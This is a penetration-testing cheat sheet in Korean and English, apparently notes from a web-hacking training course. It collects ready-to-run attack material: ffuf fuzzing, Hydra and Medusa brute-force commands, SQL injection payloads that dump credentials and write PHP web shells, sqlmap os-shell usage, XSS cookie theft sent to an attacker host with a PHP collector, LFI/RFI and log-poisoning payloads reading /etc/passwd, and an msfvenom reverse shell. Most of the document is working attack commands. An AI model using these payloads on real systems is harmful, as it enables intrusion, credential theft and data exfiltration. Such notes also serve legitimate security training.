# Proxying Tools

## 1. Proxychains
```
cat /etc/proxychains.conf

#socks4         127.0.0.1 9050
http 127.0.0.1 8080
```
```proxychains curl http://SERVER_IP:PORT```

## 2. NMAP
```nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC```

## 3. Metasploit
```
use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > set PROXIES HTTP:127.0.0.1:8080
msf6 auxiliary(scanner/http/robots_txt) > set RHOST SERVER_IP
msf6 auxiliary(scanner/http/robots_txt) > set RPORT PORT
msf6 auxiliary(scanner/http/robots_txt) > run
```

<br/><br/>
# Attacking Web Applications with Ffuf

## 1. Directory Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ```

## 2. Page Fuzzing

### 확장자 퍼징
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ```

### 페이지 퍼징
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php```

## 3. Recursive Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v```

## 4. SubDomain Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/```

## 5. Vhost Fuzzing
```ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'```

### 결과 필터링 (응답 크기는 900 예외처리)
```ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900```

## 6. Parameter Fuzzing - GET
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx```

## 7. Parameter Fuzzing - POST
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx```

## 8. Value Fuzzing
```
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

## 9. Words List
- [SecLists](https://github.com/danielmiessler/SecLists) : ```wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && unzip SecList.zip && rm -f SecList.zip```
- [Wordlists](https://github.com/3ndG4me/KaliLists.git) : ```git clone https://github.com/3ndG4me/KaliLists.git /usr/local/share/wordlists && gzip -d /usr/local/share/wordlists/rockyou.txt.gz```

<br/><br/>
# Login Brute Forcing

## 1. 비밀번호 보안

### PIN 해독하기
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## 2. 사전 공격
| 단어 목록                                       | 설명                                                          | 일반적인 사용                             | 원천                                                                                                     |
| ------------------------------------------- | ----------------------------------------------------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------ |
| `rockyou.txt`                               | RockYou 침해 사건으로 인해 수백만 개의 비밀번호가 포함된 인기 있는 비밀번호 목록이 유출되었습니다. | 일반적으로 비밀번호 무차별 대입 공격에 사용됩니다.        | [RockYou 침해 데이터 세트](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) |
| `top-usernames-shortlist.txt`               | 가장 흔한 사용자 이름을 간략하게 정리한 목록입니다.                               | 빠르고 무차별적인 사용자 이름 공격 시도에 적합합니다.      | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |
| `xato-net-10-million-usernames.txt`         | 1,000만 개에 달하는 더 광범위한 사용자 이름 목록.                             | 철저한 사용자 이름 공격에 사용됩니다.               | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |
| `2023-200_most_used_passwords.txt`          | 2023년 현재 가장 흔하게 사용된 비밀번호 200개 목록입니다.                        | 일반적으로 재사용되는 비밀번호를 타겟으로 하는 데 효과적입니다. | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |
| `Default-Credentials/default-passwords.txt` | 라우터, 소프트웨어 및 기타 장치에서 일반적으로 사용되는 기본 사용자 이름과 비밀번호 목록입니다.      | 기본 자격 증명을 시도하는 데 이상적입니다.            | [보안 목록](https://github.com/danielmiessler/SecLists/tree/master)                                        |

### 사전 대입
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## 3. 하이브리드 공격

### 비밀번호 추출
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt   # 최소 8자 길이의 비밀번호
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt    # 적어도 하나의 대문자를 포함
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt    # 적어도 하나의 소문자를 포함
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt       # 적어도 하나의 숫자가 포함
```

## 4. Hydra

### Hydra 서비스
| Hydra 서비스     | 서비스/프로토콜                         | 설명                                                                       | 예제 명령                                                                                                          |
| ------------- | -------------------------------- | ------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------- |
| FTP           | File Transfer Protocol (FTP)     | FTP 서비스에 대한 로그인 자격 증명을 무차별 대입하는 데 사용되며, 일반적으로 네트워크를 통해 파일을 전송하는 데 사용됩니다. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Secure Shell(SSH)                | 시스템에 대한 안전한 원격 로그인에 일반적으로 사용되는 자격 증명을 무차별 대입하여 SSH 서비스를 대상으로 합니다.        | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | HTTP 웹 서비스                       | GET 또는 POST 요청을 사용하여 HTTP 웹 로그인 양식에 대한 로그인 자격 증명을 무차별 대입하는 데 사용됩니다.      | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| SMTP          | Simple Mail Transfer Protocol    | SMTP(일반적으로 이메일을 보내는 데 사용됨)에 대한 로그인 자격 증명을 무차별 대입하여 이메일 서버를 공격합니다.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Post Office Protocol (POP3)      | POP3 로그인을 위해 무차별 대입 공격을 감행하여 이메일 검색 서비스를 공격합니다.                          | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Internet Message Access Protocol | 사용자가 원격으로 이메일에 접근할 수 있도록 허용하는 IMAP 서비스의 자격 증명을 무차별 대입하는 데 사용됩니다.         | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | MySQL Database                   | MySQL 데이터베이스에 대한 로그인 자격 증명을 무차별 대입하여 얻으려는 시도.                            |                                                                                                                |
| MSSQL         | Microsoft SQL Server             | Microsoft SQL 서버를 대상으로 데이터베이스 로그인 자격 증명을 무차별 대입 공격합니다.                   | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Virtual Network Computing (VNC)  | 원격 데스크톱 접속에 사용되는 VNC 서비스를 무차별 대입 공격합니다.                                  | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| RDP           | 원격 데스크톱 프로토콜(RDP)                | 원격 로그인을 무차별 대입 공격으로 Microsoft RDP 서비스를 표적으로 삼습니다.                        | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

### 무차별 대입 HTTP 인증
```hydra -L usernames.txt -P passwords.txt www.example.com http-get```

### 여러 SSH 서버를 타겟팅
```hydra -l root -p toor -M targets.txt ssh```

### 비표준 포트에서 FTP 자격 증명 테스트
```hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp```

### 웹 로그인 양식의 무차별 대입
```hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"```

### RDP 무차별 대입 공격 (6~8자의 비밀번호를 생성하고 테스트)
```hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp```

### Hydra를 사용하여 HTTP 기본 인증 활용 (포트 81)
```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

### 로그인 양식 (F=실패 조건)
```hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"```

### 로그인 양식 (S=성공 조건)
```hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"```

### Hydra를 위한 params 문자열 구성
```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## 5. Medusa

### Medusa 모듈
| Medusa Module    | Service/Protocol                 | Description                                                                                 | Usage Example                                                                                                               |
| ---------------- | -------------------------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP             | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| MySQL            | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| POP3             | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| RDP              | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| SSHv2            | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| Subversion (SVN) | Version Control System           | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |

### SSH Server 타겟팅
```medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh```

### 기본 HTTP 인증을 사용하여 여러 웹 서버 타겟팅
```medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET```

### 빈 비밀번호 또는 기본 비밀번호 테스트
```medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name```

### FTP 서버를 타겟팅
```medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5```

<br/><br/>
# 사용자 정의 단어 목록

## 1. 사용자 이름 Anarchy
```
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## 2. CUPP (Common User Passwords Profiler)
```
sudo apt install cupp -y
cupp -i    # 대화형 모드
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt   # 비밀번호 정책 적용
```

<br/><br/>
# SQL Injection
> 참고 : [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

## 1. 주석 사용

### 주석이 있는 인증 우회
```SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';```

## 2. Union 절

### 짝수 Columns
```SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '```

### 고르지 않은 Columns
```SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '```

## 3. Union Injection

### ORDER BY 사용
```
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -
```
> 알림: (-) 뒤에 공백이 있다는 것을 나타내기 위해 대시(-)를 하나 더 추가

### UNION 사용
```
cn' UNION select 1,2,3-- -
cn' UNION select 1,2,3,4-- -
```

### Injection 위치
```cn' UNION select 1,@@version,3,4-- -```

## 4. MySQL Fingerprinting

### INFORMATION_SCHEMA 데이터베이스
```cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -```<br/>
```cn' UNION select 1,database(),2,3-- -```

### TABLES
```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -```

### COLUMNS
```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -```

### Data
```cn' UNION select 1, username, password, 4 from dev.credentials-- -```

## 5. 파일 읽기

### DB User
```cn' UNION SELECT 1, user(), 3, 4-- -```<br/>
또는 ```cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -```

### 사용자 권한
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### LOAD_FILE
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## 6. 파일 쓰기

### 파일 쓰기 권한 (secure_file_priv값 확인)
```cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -```

### SELECT INTO OUTFILE
```
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

### SQL Injection을 통한 파일 쓰기
```cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -```

### Writing a Web Shell
```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -```

<br/><br/>
# SQLMap

### SQLMap 설치
```sudo apt install sqlmap```<br/>
매뉴얼 설치 : ```git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev```

### SQLMap Start (--batch : 기본 옵션)
```sqlmap -u "http://www.example.com/vuln.php?id=1" --batch```

### Curl 명령 (HTTP 요청)
```sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'```

### POST 요청
```sqlmap 'http://www.example.com/' --data 'uid=1&name=test'```

### 전체 HTTP 요청 (캡쳐된 HTTP 요청 사용)
```sqlmap -r req.txt```

### 사용자 정의 SQLMap 요청
```
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u www.target.com --data='id=1' --method PUT
```

### Prefix/Suffix
```sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"```

### Level/Risk
```sqlmap -u www.example.com/?id=1 -v 3 --level=5```

### UNION SQLi 튜닝
```
sqlmap -u "http://94.237.54.42:37117/case5.php?id=1" --dump -T flag5 --level=5 --risk=3 --no-cast
sqlmap -u "http://94.237.54.42:37117/case5.php?id=1" --batch --dump -T flag5 -D testdb --no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries
```
-  sqlmap -u "http://94.237.58.147:57029/case6.php?col=id" --batch --dump --prefix='`)'
-  sqlmap -u "http://94.237.58.147:57029/case7.php?id=1" --batch --dump -D testdb --no-cast --dbms=MySQL --union-cols=5

<br/><br/>
## 1. 데이터베이스 열거

### Basic DB Data 열거
```sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba```

### 테이블 열거
```sqlmap -u "http://www.example.com/?id=1" --tables -D testdb```<br/>
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb```

### 테이블/행 열거
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname```<br/>
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3```

### 조건 열거
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"```

### 전체 DB 열거
```sqlmap -u "http://94.237.58.147:32720/case1.php?id=1" --batch --dump -D testdb -T flag1 --no-cast --dbms=MySQL```

## 2. Advanced Database 열거

### DB 스키마 열거
```sqlmap -u "http://www.example.com/?id=1" --schema```

### 데이터 검색
```sqlmap -u "http://www.example.com/?id=1" --search -T user```<br/>
```sqlmap -u "http://www.example.com/?id=1" --search -C pass```

### 비밀번호 열거 및 cracking
```sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users```

### DB 사용자 비밀번호 열거 및 cracking
```sqlmap -u "http://www.example.com/?id=1" --passwords --batch```

## 3. 웹 애플리케이션 보호 우회

### Anti-CSRF Token Bypass
```sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"```

### Unique Value Bypass
```sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI```

### 계산된 Parameter Bypass
```sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI```

### 기타 우회
```sqlmap -u "http://94.237.58.147:32720/case8.php" --data="id=1&t0ken=obDoPdz6ZhgfhUmxYp9VbLhAKDnPkIFEDILj6u0pUAs" --csrf-token="t0ken" -T flag8 --dump```<br/>
```sqlmap -u "http://94.237.58.147:32720/case9.php?id=1&uid=87808050" --randomize=uid --batch -T flag9 --dump```<br/>
```sqlmap -u "http://94.237.58.106:53037/case10.php" --data="id=1" --random-agent -T flag10 --dump```<br/>
```sqlmap -u "http://94.237.58.106:53037/case11.php?id=1" --tamper=between -T flag11 --dump```

## 4. OS Exploitation

### DBA 권한 확인
```sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba```<br/>
```sqlmap -u "http://www.example.com/?id=1" --is-dba```

### 로컬 파일 읽기
```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

### 로컬 파일 쓰기
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
curl http://www.example.com/shell.php?cmd=ls+-la
```

## 5. OS 명령 실행

```sqlmap -u "http://www.example.com/?id=1" --os-shell```<br/>
```sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E```  # Error-based SQLi

<br/><br/>
# XSS 

### Stored XSS
```<script>alert(window.origin)</script>```

### DOM 공격
```<img src="" onerror=alert(window.origin)>```

## XSS Discovery

### Automated Discovery (XSS Strike)
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

## Manual Discovery

### XSS Payloads
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)

## 세션 하이재킹

### Loading a Remote Script
```><script src="http://OUR_IP/script.js"></script>```

### script.js
```document.location='http://OUR_IP/index.php?c='+document.cookie;```<br/>
또는 ```new Image().src='http://OUR_IP/index.php?c='+document.cookie;```

### index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
<br/><br/>
# File Inclusion

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

### Basic LFI
```/index.php?language=/etc/passwd```<br/>
```/index.php?language=../../../../etc/passwd```<br/>
```/index.php?language=/../../../etc/passwd```<br/>
```GET /index.php?language=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd```<br/>
```/index.php?language=./languages/../../../../etc/passwd```<br/>
``` GET /index.php?language=languages/....//....//....//....//...//flag.txt```

### LFI Bypasses
```/index.php?language=....//....//....//....//....//etc/passwd```<br/>
```/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64```<br/>
```/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]```<br/>
```echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done```<br/>
```/index.php?language=../../../../etc/passwd%00```<br/>
```/index.php?language=php://filter/read=convert.base64-encode/resource=config```

### PHP Files 퍼징
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php```
  
### Source Code 노출
```/index.php?language=php://filter/read=convert.base64-encode/resource=configure```

### PHP Wrappers

#### PHP Configurations 체크
```curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"```

#### Remote Code Execution
```
echo '<?php system($_GET["cmd"]); ?>' | base64
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

#### Input
```curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"```<br/>

#### Expect
```curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"```

### RFI Remote File Inclusion
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <LISTENING_PORT>
```
```/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id```

### LFI & File Upload
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
/index.php?language=./profile_images/shell.gif&cmd=id
```
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

#### shell.php
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

<br/><br/>
## Log Poisoning

### PHP Session Poisoning

```http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning```
```
PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### Server Log Poisoning
```curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"```

<br/><br/>
## 자동 스캐닝

### Fuzzing Parameters
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287```
> 참고 : [Top 25 parameters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)

### LFI wordlists
```ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287```

### Fuzzing Server Files

#### Server Webroot
```ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287```

#### Server Logs/Configurations
```ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287```

### 단어 목록
- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
- [Linux용 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
- [Windows용 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

<br/><br/>
# File Upload

## Web Shells
- [phpbash](https://github.com/Arrexel/phpbash)
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

## Writing Custom Web Shell
PHP : ```<?php system($_REQUEST['cmd']); ?>```<br/>
.NET : ```<% eval request('cmd') %>```

## Reverse Shell
- [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)

## 사용자 정의 Reverse Shell 스크립트 생성
```msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php```

## Double Extensions
- [단어 목록](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
- [PHP 단어 목록](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
